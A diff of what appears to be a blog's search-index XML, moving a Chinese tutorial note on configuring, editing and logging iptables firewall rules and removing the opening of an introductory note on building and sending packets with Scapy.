@@ -2470,292 +2470,6 @@
       </tags>
   </entry>
   <entry>
-    <title>iptables note</title>
-    <url>/2022/05/23/note_iptables/</url>
-    <content><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ul>
-<li>iptables 用于<strong>检查、修改、转发、重定向和丢弃</strong> IP 数据包。</li>
-<li><p>过滤 IP 数据包的代码已经内置在内核中，并被<strong>组织成一组表</strong>，每个表都有特定的用途。</p>
-<ul>
-<li>这些表由一组<strong>预定义的链</strong>组成，链包含按顺序遍历的规则。</li>
-</ul>
-</li>
-<li><p>每个规则由一个潜在匹配的<strong>谓词</strong>和一个对应的<strong>操作</strong>(称为目标)组成。</p>
-<ul>
-<li>如果谓词为真，则执行该动作；即条件匹配。</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<p>iptables允许用户使用这些链和规则</p>
-</blockquote>
-<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><ul>
-<li>iptables工作原理</li>
-</ul>
-<p><img src="https://www.frozentux.net/iptables-tutorial/images/tables_traverse.jpg" alt=""></p>
-<blockquote>
-<p>小写是表，大写是链。</p>
-<p><strong>所有(无论内部外部)进入网卡的IP数据包都必须经历这个流程！</strong></p>
-</blockquote>
-<ul>
-<li>如果 IP 数据包到达一个内置链的末端，包括一个空链，那么该链的策略target 便决定 IP 数据包的最终目的地。</li>
-</ul>
-<h2 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h2><ul>
-<li>iptables本质上<strong>不是通常定义的防火墙</strong>，实践上是做了一个代理。<ul>
-<li>将用户设置的安全规则在安全框架(netfilter)中执行。</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<p><strong>netfilter位于内核空间</strong>，是真正的防火墙框架。</p>
-<p>iptables在用户空间，可以控制安全框架。</p>
-</blockquote>
-<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ul>
-<li>在任何接口上接收的网络数据包都将<strong>按照流程图</strong>中所示的顺序遍历表的流量控制链。</li>
-<li><u>第一个路由决策</u>涉及<strong>决定信息包的最终目的地是本地机器</strong>(在这种情况下，信息包<strong>通过INPUT链</strong>)<strong>还是其他机器</strong>(在这种情况下，信息包<strong>通过FORWARD链</strong>)。</li>
-<li><u>随后的路由决策</u>包括<strong>决定将哪个接口分配给一个出包</strong>。<ul>
-<li>在路径中的每个链上，该链中的每个规则都<strong>按顺序计算</strong>，每当规则匹配时，就执行相应的目标/跳转操作。<strong>3个最常用的目标是ACCEPT、DROP和跳转到用户定义链</strong>。</li>
-<li>虽然<strong>内置链可以有默认策略</strong>，但<strong>用户定义链不能</strong>。</li>
-<li>如果跳过的链中的每个规则<u>都不能提供完全匹配</u>，则包将<strong>被丢回调用链中</strong>，如下图所示。</li>
-<li>如果在任何时候<u>对具有DROP目标的规则实现了完全匹配</u>，则<strong>丢弃数据包</strong>，不再进行进一步的处理。</li>
-<li>如果一个包<u>在一个链中被ACCEPT</u>，它也<strong>将在<u>所有超集链</u>中被ACCEPT</strong>，并且它<strong>将不再进一步遍历任何超集链</strong>。但是，包将继续<strong><u>以正常方式遍历</u>其他表中的所有其他链</strong>。</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://www.frozentux.net/iptables-tutorial/images/table_subtraverse.jpg" alt=""></p>
-<h1 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h1><h2 id="表"><a href="#表" class="headerlink" title="表"></a>表</h2><ul>
-<li>iptables 包含五个表：<ol>
-<li>raw仅用于配置数据包，使它们免于连接跟踪。</li>
-<li>filter是默认表，通常与防火墙相关联的所有操作都发生在该表中。</li>
-<li>nat用于网络地址转换（例如端口转发）。</li>
-<li>mangle用于专门的数据包更改。</li>
-<li>security用于强制访问控制网络规则。</li>
-</ol>
-</li>
-</ul>
-<blockquote>
-<p><strong>常用的表为filter和nat</strong>。</p>
-</blockquote>
-<h2 id="链"><a href="#链" class="headerlink" title="链"></a>链</h2><ul>
-<li><p>表由链组成，链是按顺序遵循的规则列表。</p>
-<ul>
-<li>缺省表filter包含三个内置链：INPUT、OUTPUT和FORWARD，它们在包过滤过程的不同点被激活。</li>
-<li>nat表包括PREROUTING、POSTROUTING和OUTPUT链。</li>
-</ul>
-</li>
-<li><p><strong>缺省情况下，没有一个链包含规则</strong>。将规则附加到想要使用的链上<strong>由用户自己决定</strong>。</p>
-</li>
-<li>链有一个默认策略，通常将其设置为ACCEPT，但如果希望确保没有任何东西能通过规则集，则可以将其重置为DROP。<ul>
-<li>默认策略总是<strong>只应用于链的末端</strong>。因此，在应用缺省策略之前，信息包必须通过链中的所有现有规则。</li>
-<li>可以添加用户定义链，使规则集更高效或更容易修改。</li>
-</ul>
-</li>
-</ul>
-<h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><ul>
-<li>包过滤是基于规则的，<strong>规则由多个<u>匹配项</u>(报文必须满足的条件才能应用该规则)和一个<u>目标</u>(报文匹配所有条件时的动作)指定</strong>。<ul>
-<li>规则可能匹配的典型内容是数据包来自哪个网卡(例如eth0或eth1)，它是什么类型的数据包(ICMP、TCP或UDP)，或者数据包的目的端口。</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<p>使用-j或—jump选项指定目标。</p>
-</blockquote>
-<ul>
-<li><strong>目标</strong>可以是<strong>用户定义链</strong>(如果这些条件匹配，则跳转到以下用户定义链并在那里继续处理)、<strong>特殊的内置目标之一或目标扩展</strong>。<ul>
-<li><strong>内置目标</strong>是ACCEPT, DROP, QUEUE和RETURN，如果目标是内置目标，则<strong>立即决定数据包的命运</strong>，并停止对当前表中的数据包的处理。</li>
-<li><strong>目标扩展</strong>包括例如REJECT和LOG。</li>
-<li><strong>用户定义链</strong>，若数据包的命运不是由该链决定的，它将<strong>根据原始链的剩余规则进行过滤</strong>。目标扩展可以是终止的(作为内置目标)或非终止的(作为用户定义的链)。</li>
-</ul>
-</li>
-</ul>
-<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><ul>
-<li>有许多模块可用于扩展 iptables，例如 connlimit、conntrack、limit 和 recent。<ul>
-<li>这些模块添加了额外的功能以<strong>允许复杂的过滤规则</strong>。</li>
-</ul>
-</li>
-</ul>
-<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><ul>
-<li>iptables是一个<strong>systemd服务</strong>，叫做iptables.service。<ul>
-<li>iptables包在<code>/etc/iptables/iptables.rules</code>中安装了一组空的规则，当你第一次启动iptables.service单元时将加载这些规则。</li>
-<li>与其他服务一样，如果希望iptables在引导时自动加载，则必须启用它。</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<p>IPv6的iptables规则默认保存在<code>/etc/iptables/ip6tables.rules</code>中，由ip6tables.service读取。</p>
-</blockquote>
-<ul>
-<li>如下所示，通过命令行添加规则后，配置文件不会自动更改，必须手动保存:</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables-save -f /etc/iptables/iptables.rules</span><br></pre></td></tr></table></figure>
-<ul>
-<li>如果手动编辑配置文件，则必须重新加载iptables。或者你可以直接通过iptables加载它：</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables-restore /etc/iptables/iptables.rules</span><br></pre></td></tr></table></figure>
-<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="显示当前规则"><a href="#显示当前规则" class="headerlink" title="显示当前规则"></a>显示当前规则</h2><ul>
-<li>列出当前规则的基本命令是list-rules (-S)，其输出格式类似于iptables-save实用程序。<ul>
-<li>这两个命令的主要区别是，后者默认输出<strong>所有表</strong>的规则，而所有iptables命令默认只输出<strong>filter表</strong>。</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">student@6858-v20:~$ sudo iptables -S</span><br><span class="line">-P INPUT ACCEPT</span><br><span class="line">-P FORWARD ACCEPT</span><br><span class="line">-P OUTPUT ACCEPT</span><br></pre></td></tr></table></figure>
-<ul>
-<li>—list (-L)命令接受更多修饰符并显示更多信息。<ul>
-<li>例如，可以使用以下命令查看当前的规则集和每条规则的命中次数:</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">student@6858-v20:~$ sudo iptables -nvL</span><br><span class="line">Chain INPUT (policy ACCEPT 1059 packets, 89762 bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT 1051 packets, 88652 bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination </span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>如果输出像上面那样，那么在默认的过滤表中没有规则(即没有阻塞)。</p>
-<p>可以使用-t选项指定其他表。</p>
-</blockquote>
-<ul>
-<li>要在列出规则时显示行号，请将—line-numbers追加到该输入。当在命令行上编辑规则时，行号是一种有用的速记。</li>
-</ul>
-<h2 id="重置规则"><a href="#重置规则" class="headerlink" title="重置规则"></a>重置规则</h2><ul>
-<li>可以使用以下命令将iptables刷新和重置为默认值：</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t nat -X</span><br><span class="line">iptables -t mangle -F</span><br><span class="line">iptables -t mangle -X</span><br><span class="line">iptables -t raw -F</span><br><span class="line">iptables -t raw -X</span><br><span class="line">iptables -t security -F</span><br><span class="line">iptables -t security -X</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">iptables -P OUTPUT ACCEPT</span><br></pre></td></tr></table></figure>
-<ul>
-<li>不带参数的-F命令将<strong>刷新其当前表中的所有链</strong>。<ul>
-<li>类似地，-X<strong>删除表中所有空的非默认链</strong>。</li>
-<li>可以通过在-F和-X后面<u>加上[chain]参数</u>来<strong>清除或删除单个链</strong>。</li>
-</ul>
-</li>
-</ul>
-<h2 id="编辑规则"><a href="#编辑规则" class="headerlink" title="编辑规则"></a>编辑规则</h2><ul>
-<li>可以通过以下方式<strong>编辑规则</strong>：在链上添加-A规则，在链上的特定位置插入-I，替换现有规则-R，或删除-D规则。<ul>
-<li>下面举例说明了前三个命令。</li>
-</ul>
-</li>
-<li>首先，我们的计算机不是路由器。我们希望将FORWARD链上的默认策略从ACCEPT更改为DROP。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -P FORWARD DROP</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Dropbox的局域网同步功能每30秒向它能看到的所有计算机广播数据包。如果我们碰巧与Dropbox客户端在局域网中，并且没有使用该功能，那么我们可能会希望拒绝这些数据包。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 17500 -j REJECT --reject-with icmp-port-unreachable</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">student@6858-v20:~$ sudo iptables -nvL --line-numbers</span><br><span class="line">Chain INPUT (policy ACCEPT 67 packets, 5771 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line">1        0     0 REJECT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:17500 reject-with icmp-port-unreachable</span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy DROP 0 packets, 0 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT 55 packets, 5174 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>注意：这里我们<strong>使用REJECT而不是DROP</strong>，因为RFC 1122<u>要求主机尽可能地返回ICMP错误，而不是丢弃数据包</u>。<a href="https://www.chiark.greenend.org.uk/~peterb/network/drop-vs-reject">这一页</a>解释了为什么拒绝包几乎总是比DROP包更好。</p>
-</blockquote>
-<ul>
-<li>现在，假设我们改变了对Dropbox的看法，决定在自己的电脑上安装它。我们还想进行局域网同步，但只能与网络上的一个特定IP进行同步。<ul>
-<li>所以我们应该<strong>用-R来代替原来的规则</strong>。其中10.0.0.85是我们的其他IP：</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -R INPUT 1 -p tcp --dport 17500 ! -s 10.0.0.85 -j REJECT --reject-with icmp-port-unreachable</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">student@6858-v20:~$ sudo iptables -nvL --line-numbers</span><br><span class="line">Chain INPUT (policy ACCEPT 21 packets, 1849 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line">1        0     0 REJECT     tcp  --  *      *      !10.0.0.85            0.0.0.0/0            tcp dpt:17500 reject-with icmp-port-unreachable</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>我们现在已经用一个允许10.0.0.85访问17500端口的规则替换了原来的规则。</p>
-</blockquote>
-<ul>
-<li>我们意识到这是<strong>不可扩展的</strong>。如果我们<u>友好的Dropbox用户</u>试图访问设备上的17500端口，我们应该<u>立即允许</u>他，而不是测试他是否违反任何防火墙规则。<ul>
-<li>因此，我们编写了一个新的规则，允许我们的信任用户。使<strong>用-I将新规则插入到旧规则之前</strong>：</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 17500 -s 10.0.0.85 -j ACCEPT -m comment --comment <span class="string">&quot;Friendly Dropbox&quot;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">student@6858-v20:~$ sudo iptables -nvL --line-numbers</span><br><span class="line">Chain INPUT (policy ACCEPT 19 packets, 1857 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line">1        0     0 ACCEPT     tcp  --  *      *       10.0.0.85            0.0.0.0/0            tcp dpt:17500 /* Friendly Dropbox */</span><br><span class="line">2        0     0 REJECT     tcp  --  *      *      !10.0.0.85            0.0.0.0/0            tcp dpt:17500 reject-with icmp-port-unreachable</span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy DROP 0 packets, 0 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT 16 packets, 1892 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination</span><br></pre></td></tr></table></figure>
-<ul>
-<li>把我们的第二条规则替换成拒绝所有17500端口的规则：</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -R INPUT 2 -p tcp --dport 17500 -j REJECT --reject-with icmp-port-unreachable</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">student@6858-v20:~$ sudo iptables -nvL --line-numbers</span><br><span class="line">Chain INPUT (policy ACCEPT 19 packets, 1656 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line">1        0     0 ACCEPT     tcp  --  *      *       10.0.0.85            0.0.0.0/0            tcp dpt:17500 /* Friendly Dropbox */</span><br><span class="line">2        0     0 REJECT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:17500 reject-with icmp-port-unreachable</span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy DROP 0 packets, 0 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT 15 packets, 2224 bytes)</span><br><span class="line">num   pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination </span><br></pre></td></tr></table></figure>
-<h2 id="允许组播流量"><a href="#允许组播流量" class="headerlink" title="允许组播流量"></a>允许组播流量</h2><ul>
-<li>使用多播标识的协议(例如，SANE搜索网络扫描器)将向网络的广播IP发送流量，并从特定的客户端的IP返回响应。<ul>
-<li>由于这些IP地址是不同的，所以iptables不会将响应识别为RELATED或ESTABLISHED，它将<strong>阻塞响应</strong>。</li>
-</ul>
-</li>
-<li>首先，创建一个ipset散列容器。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ipset create upnp <span class="built_in">hash</span>:ip,port <span class="built_in">timeout</span> 3</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>timeout是接受客户端响应的时间窗口。</p>
-</blockquote>
-<ul>
-<li>其次，创建一个规则，将传出多播流量添加到ipset散列中。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A OUTPUT -d 239.255.255.250/32 -p udp -m udp -j SET --add-set upnp src,src --exist</span><br></pre></td></tr></table></figure>
-<ul>
-<li>第三，创建一个规则，允许与ipset散列匹配的传入流量。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p udp -m <span class="built_in">set</span> --match-set upnp dst,dst -j ACCEPT</span><br></pre></td></tr></table></figure>
-<ul>
-<li>最后，记住保存新规则，并确保启用iptables.service和ipset.service，以便在系统启动时加载规则。</li>
-</ul>
-<h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><ul>
-<li><p>LOG目标可以用来记录命中规则的数据包。与其他目标(如ACCEPT或DROP)不同，<strong>包在命中LOG目标后将继续在链中移动</strong>。</p>
-<ul>
-<li>这意味着，为了对所有丢失的包启用日志记录，必须在每个DROP规则之前添加一个重复的LOG规则。</li>
-<li>由于这降低了效率并使事情变得不那么简单，因此可以创建一个logdrop链。</li>
-</ul>
-</li>
-<li><p>创建链</p>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -N logdrop</span><br></pre></td></tr></table></figure>
-<ul>
-<li>并将以下规则添加到新创建的链:</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A logdrop -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 5/m --limit-burst 10 -j LOG</span><br><span class="line">iptables -A logdrop -j DROP</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>limit和limit-burst选项解释<a href="#限制日志速率">如下</a>。</p>
-</blockquote>
-<ul>
-<li>现在，当我们想要丢弃一个包并记录这个事件时，我们只需跳转到日志丢弃链，例如：</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -m conntrack --ctstate INVALID -j logdrop</span><br></pre></td></tr></table></figure>
-<h2 id="限制日志速率"><a href="#限制日志速率" class="headerlink" title="限制日志速率"></a>限制日志速率</h2><ul>
-<li>上面的logdrop链<strong>使用<u>limit模块</u>来防止iptables日志变得太大或导致不必要的硬盘写操作</strong>。<ul>
-<li>在不限制错误配置的服务尝试连接的情况下，攻击者可以<u>通过引起对iptables日志的写入来填充驱动器</u>(或至少是<code>/var</code>分区)。</li>
-</ul>
-</li>
-<li>limit模块<strong>使用-m limit调用</strong>。<ul>
-<li>使用—limit来<strong>设置平均速率</strong>；</li>
-<li>使用—limit-burst来<strong>设置初始突发速率</strong>。</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A logdrop -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 5/m --limit-burst 10 -j LOG</span><br></pre></td></tr></table></figure>
-<ul>
-<li>上述命令<u>附加</u>一个规则，该规则将记录通过它的所有数据包。<ul>
-<li>记录<u>前10个连续数据包</u>，从那时起<u>每分钟仅记录5个数据包</u>。</li>
-<li>每当“限制速率”未被打破时，“限制突发”计数将被重置，即日志记录活动自动恢复正常。</li>
-</ul>
-</li>
-</ul>
-<h2 id="查看记录包"><a href="#查看记录包" class="headerlink" title="查看记录包"></a>查看记录包</h2><ul>
-<li>记录的数据包在systemd journal中<strong>作为内核消息可见</strong>。</li>
-<li>要查看自计算机最后一次启动以来记录的所有包：</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">journalctl -k --grep=<span class="string">&quot;IN=.*OUT=.*&quot;</span></span><br></pre></td></tr></table></figure>
-<h2 id="syslog-ng"><a href="#syslog-ng" class="headerlink" title="syslog-ng"></a>syslog-ng</h2><ul>
-<li>可以在syslog-ng.conf中<strong>控制iptables的日志输出到哪里</strong>。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Replace</span></span><br><span class="line">filter f_everything &#123; level(debug..emerg) and not facility(auth, authpriv); &#125;;</span><br><span class="line"><span class="comment"># To</span></span><br><span class="line">filter f_everything &#123; level(debug..emerg) and not facility(auth, authpriv) and not filter(f_iptables); &#125;;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>这将停止将iptables输出记录到<code>/var/log/everything.log</code>。</p>
-</blockquote>
-<ul>
-<li>如果你也想让iptables记录到不同于<code>/var/log/iptables.log</code>的文件中，可以简单地改变目标d_iptables的文件值(仍然在syslog-ng.conf中):</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">destination d_iptables &#123; file(<span class="string">&quot;/var/log/iptables.log&quot;</span>); &#125;;</span><br></pre></td></tr></table></figure>
-<h2 id="ulogd"><a href="#ulogd" class="headerlink" title="ulogd"></a>ulogd</h2><ul>
-<li>ulogd是用于netfilter的专用用户空间包日志记录守护进程，它可以替换默认的LOG目标。</li>
-<li>ulogd包可以在[community]存储库中找到。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>note</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>iptables</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Effective C++ note</title>
     <url>/2022/05/17/note_effective_cpp/</url>
     <content><![CDATA[<h1 id="条款01：视C-为一个语言联邦"><a href="#条款01：视C-为一个语言联邦" class="headerlink" title="条款01：视C++为一个语言联邦"></a>条款01：视C++为一个语言联邦</h1><ul>
@@ -3346,258 +3060,289 @@
       </tags>
   </entry>
   <entry>
-    <title>Scapy note</title>
-    <url>/2022/05/17/note_scapy/</url>
-    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><ul>
-<li>首先给出<a href="https://scapy.net/">官网</a>。</li>
-<li><code>Scapy</code>是用<code>Python</code>编写的交互式数据包处理工具。</li>
-<li>使用<code>Scapy</code>可以伪造或解码各种协议的数据包，在线发送它们，捕获它们，匹配请求和答复等等。 </li>
-</ul>
-<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><ul>
-<li>由于是<code>Python</code>编写的，使用<code>pip install</code>进行安装，这里使用清华源加速。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install scapy -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
+    <title>iptables note</title>
+    <url>/2022/05/23/note_iptables/</url>
+    <content><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ul>
+<li>iptables 用于<strong>检查、修改、转发、重定向和丢弃</strong> IP 数据包。</li>
+<li><p>过滤 IP 数据包的代码已经内置在内核中，并被<strong>组织成一组表</strong>，每个表都有特定的用途。</p>
 <ul>
-<li>直接使用<code>scapy</code>命令打开，若显示无法导入相关库，则对其中缺失的相关包进行安装。</li>
+<li>这些表由一组<strong>预定义的链</strong>组成，链包含按顺序遍历的规则。</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">INFO: Can<span class="string">&#x27;t import matplotlib. Won&#x27;</span>t be able to plot.</span><br><span class="line">INFO: Can<span class="string">&#x27;t import PyX. Won&#x27;</span>t be able to use psdump() or pdfdump().</span><br></pre></td></tr></table></figure>
-<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="包配置"><a href="#包配置" class="headerlink" title="包配置"></a>包配置</h2><ul>
-<li>使用<code>TCP/IP</code>协议构造基本数据包，这里调用了<code>Scapy</code>的内置函数<code>IP()</code>和<code>TCP()</code>。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pkt = IP()/TCP()</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><font color="red">注意</font>：<code>IP()</code>一定在<code>TCP()</code>之前。</p>
-<p><code>IP()</code>参数解析</p>
-</blockquote>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>含义</th>
-<th>默认值</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>version</td>
-<td>版本</td>
-<td>4</td>
-</tr>
-<tr>
-<td>ihl</td>
-<td>报头长度</td>
-<td>None</td>
-</tr>
-<tr>
-<td>tos</td>
-<td>服务类型</td>
-<td>0x0</td>
-</tr>
-<tr>
-<td>len</td>
-<td>报文总长度</td>
-<td>None</td>
-</tr>
-<tr>
-<td>id</td>
-<td>标识符</td>
-<td>1</td>
-</tr>
-<tr>
-<td>flags</td>
-<td>标记</td>
-<td>NULL</td>
-</tr>
-<tr>
-<td>frag</td>
-<td>段偏移</td>
-<td>0</td>
-</tr>
-<tr>
-<td>ttl</td>
-<td>生存周期</td>
-<td>64</td>
-</tr>
-<tr>
-<td>proto</td>
-<td>协议</td>
-<td>tcp</td>
-</tr>
-<tr>
-<td>chksum</td>
-<td>校验和</td>
-<td>None</td>
-</tr>
-<tr>
-<td>src</td>
-<td>源<code>IP</code>地址</td>
-<td>127.0.0.1</td>
-</tr>
-<tr>
-<td>dst</td>
-<td>目的<code>IP</code>地址</td>
-<td>127.0.0.1</td>
-</tr>
-</tbody>
-</table>
-</div>
-<blockquote>
-<p><code>TCP()</code>参数解析</p>
-</blockquote>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>含义</th>
-<th>默认值</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>sport</td>
-<td>源端口</td>
-<td>ftp_data</td>
-</tr>
-<tr>
-<td>dport</td>
-<td>目的端口</td>
-<td>http</td>
-</tr>
-<tr>
-<td>seq</td>
-<td>序号</td>
-<td>0</td>
-</tr>
-<tr>
-<td>ack</td>
-<td>确认号</td>
-<td>0</td>
-</tr>
-<tr>
-<td>dataofs</td>
-<td>数据偏移</td>
-<td>None</td>
-</tr>
-<tr>
-<td>reserved</td>
-<td>保留位</td>
-<td>0</td>
-</tr>
-<tr>
-<td>flags</td>
-<td>控制功能</td>
-<td>S</td>
-</tr>
-<tr>
-<td>window</td>
-<td>窗口大小</td>
-<td>8192</td>
-</tr>
-<tr>
-<td>chksum</td>
-<td>校验和</td>
-<td>None</td>
-</tr>
-<tr>
-<td>urgptr</td>
-<td>紧急指针</td>
-<td>0</td>
-</tr>
-<tr>
-<td>options</td>
-<td>选项</td>
-<td>[]</td>
-</tr>
-</tbody>
-</table>
-</div>
+</li>
+<li><p>每个规则由一个潜在匹配的<strong>谓词</strong>和一个对应的<strong>操作</strong>(称为目标)组成。</p>
 <ul>
-<li>根据需求设置数据包之后，使用<code>&#123;PKT_NAME&#125;.show()</code>可以查看报文信息。</li>
+<li>如果谓词为真，则执行该动作；即条件匹配。</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= None</span><br><span class="line">  src= 192.168.239.128</span><br><span class="line">  dst= 110.242.68.4</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport= ftp_data</span><br><span class="line">     dport= http</span><br><span class="line">     <span class="built_in">seq</span>= 0</span><br><span class="line">     ack= 0</span><br><span class="line">     dataofs= None</span><br><span class="line">     reserved= 0</span><br><span class="line">     flags= S</span><br><span class="line">     window= 8192</span><br><span class="line">     chksum= None</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= []</span><br></pre></td></tr></table></figure>
-<h2 id="包发送"><a href="#包发送" class="headerlink" title="包发送"></a>包发送</h2><ul>
-<li>使用<code>send()</code>函数发送数据包，该函数不返回响应。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; send(pkt)</span><br><span class="line">.</span><br><span class="line">Sent 1 packets.</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><code>sendp()</code>等加了<code>p</code>的函数作用于第二层，发送的是帧。</p>
-</blockquote>
-<ul>
-<li><code>sr()</code>和<code>sr1()</code>发送数据包并接收响应。</li>
-</ul>
